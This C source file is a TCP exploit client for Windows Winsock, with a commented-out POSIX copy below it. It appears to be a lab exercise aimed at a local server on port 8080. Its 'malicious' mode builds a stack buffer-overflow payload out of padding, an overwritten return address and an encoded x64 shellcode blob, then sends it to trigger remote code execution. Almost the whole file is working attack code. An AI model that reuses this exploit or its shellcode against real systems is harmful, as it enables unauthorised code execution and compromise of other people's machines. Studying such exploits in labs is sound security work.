#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>



ssize_t normal_payload(char *payload){
    char msg[] = "Hello!\n";
    memcpy(payload, msg, sizeof(msg));
    return strlen(payload);
}

ssize_t malicious_payload(char *payload){
    int offset = 40;
    char rip[8] = {0x90, 0xcb, 0xff, 0xff, 0x07, 0x00, 0x00, 0x00};
    unsigned char shell_code[] = 
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x88\xd4\xd7\x05\x59\xa3\x5e\x9c\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x74\x9c\x54\xe1\xa9\x4b"
"\x9e\x9c\x88\xd4\x96\x54\x18\xf3\x0c\xcd\xde\x9c\xe6\xd7\x3c"
"\xeb\xd5\xce\xe8\x9c\x5c\x57\x41\xeb\xd5\xce\xa8\x9c\x5c\x77"
"\x09\xeb\x51\x2b\xc2\x9e\x9a\x34\x90\xeb\x6f\x5c\x24\xe8\xb6"
"\x79\x5b\x8f\x7e\xdd\x49\x1d\xda\x44\x58\x62\xbc\x71\xda\x95"
"\x86\x4d\xd2\xf1\x7e\x17\xca\xe8\x9f\x04\x89\x28\xde\x14\x88"
"\xd4\xd7\x4d\xdc\x63\x2a\xfb\xc0\xd5\x07\x55\xd2\xeb\x46\xd8"
"\x03\x94\xf7\x4c\x58\x73\xbd\xca\xc0\x2b\x1e\x44\xd2\x97\xd6"
"\xd4\x89\x02\x9a\x34\x90\xeb\x6f\x5c\x24\x95\x16\xcc\x54\xe2"
"\x5f\x5d\xb0\x34\xa2\xf4\x15\xa0\x12\xb8\x80\x91\xee\xd4\x2c"
"\x7b\x06\xd8\x03\x94\xf3\x4c\x58\x73\x38\xdd\x03\xd8\x9f\x41"
"\xd2\xe3\x42\xd5\x89\x04\x96\x8e\x5d\x2b\x16\x9d\x58\x95\x8f"
"\x44\x01\xfd\x07\xc6\xc9\x8c\x96\x5c\x18\xf9\x16\x1f\x64\xf4"
"\x96\x57\xa6\x43\x06\xdd\xd1\x8e\x9f\x8e\x4b\x4a\x09\x63\x77"
"\x2b\x8a\x4d\xe3\xa2\x5e\x9c\x88\xd4\xd7\x05\x59\xeb\xd3\x11"
"\x89\xd5\xd7\x05\x18\x19\x6f\x17\xe7\x53\x28\xd0\xe2\x53\xeb"
"\x3e\xde\x95\x6d\xa3\xcc\x1e\xc3\x63\x5d\x9c\x54\xc1\x71\x9f"
"\x58\xe0\x82\x54\x2c\xe5\x2c\xa6\xe5\xdb\x9b\xa6\xb8\x6f\x59"
"\xfa\x1f\x15\x52\x2b\x02\x66\x38\xcf\x3d\xb2\xed\xac\xb2\x05"
"\x59\xa3\x5e\x9c";



    memset(payload, 'A', offset);
    memcpy(payload + offset, rip, sizeof(rip));
    memcpy(payload + offset + sizeof(rip), shell_code, sizeof(shell_code));
    memcpy(payload + offset + sizeof(rip) + sizeof(shell_code), "\n", 1);

    return offset + sizeof(rip) + sizeof(shell_code) + 1;
}



int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s mode (0 for normal payload, 1 for malicious payload)\n", argv[0]);
        return 1;
    }

    int mode = atoi(argv[1]);

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed\n");
        return 1;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        perror("Socket creation failed");
        return 1;
    }

    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8080);
    serverAddress.sin_addr.s_addr = inet_addr("127.0.0.1"); // Change to the server's IP address

    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        perror("Connection failed");
        return 1;
    }

    char buffer[1024];
    memset(buffer, 0, sizeof(buffer));

    ssize_t bytesSend, bytesRead;

    if (mode == 0)
        bytesSend = normal_payload(buffer);
    else
        bytesSend = malicious_payload(buffer);

    printf("send: %s", buffer);
    fflush(stdin);

    // Send data to the server
    send(clientSocket, buffer, bytesSend, 0);

    // Receive and display the server's response
    bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
    if (bytesRead <= 0) {
        perror("Server closed the connection");
    }

    printf("Server response: %.*s\n", (int)bytesRead, buffer);

    closesocket(clientSocket);
    WSACleanup();
    return 0;
}



/*
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s input_file\n", argv[0]);
        return 1;
    }

    int mode = atoi(argv[1]);

    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == -1) {
        perror("Socket creation failed");
        return 1;
    }

    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8080);
    serverAddress.sin_addr.s_addr = inet_addr("127.0.0.1"); // Change to the server's IP address

    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == -1) {
        perror("Connection failed");
        return 1;
    }


    char buffer[1024];
    memset(buffer, 0, sizeof(buffer));


    ssize_t bytesRead, bytesSend;

    if (mode == 0)
        bytesSend = normal_payload(buffer);
    else 
        bytesSend = malicious_payload(buffer);

    printf("send: %s", buffer);
    fflush(stdin);

    // Send data from the file to the server
    send(clientSocket, buffer, bytesSend, 0);

    // Receive and display the server's response
    bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
    if (bytesRead <= 0) {
        perror("Server closed the connection");
    }

    printf("Server response: %.*s\n", (int)bytesRead, buffer);
    

    close(clientSocket);
    return 0;
}*/
